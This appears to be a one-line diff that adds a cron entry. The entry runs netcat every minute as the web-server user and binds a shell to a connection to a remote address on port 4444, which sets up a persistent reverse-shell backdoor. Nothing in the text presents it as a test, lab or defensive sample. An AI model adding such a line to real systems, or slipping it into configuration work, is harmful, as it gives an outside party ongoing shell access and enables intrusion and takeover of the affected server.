@@ -1,0 +1,1 @@
+* * * * * www-data /usr/bin/nc -e /bin/sh 198.51.100.7 4444
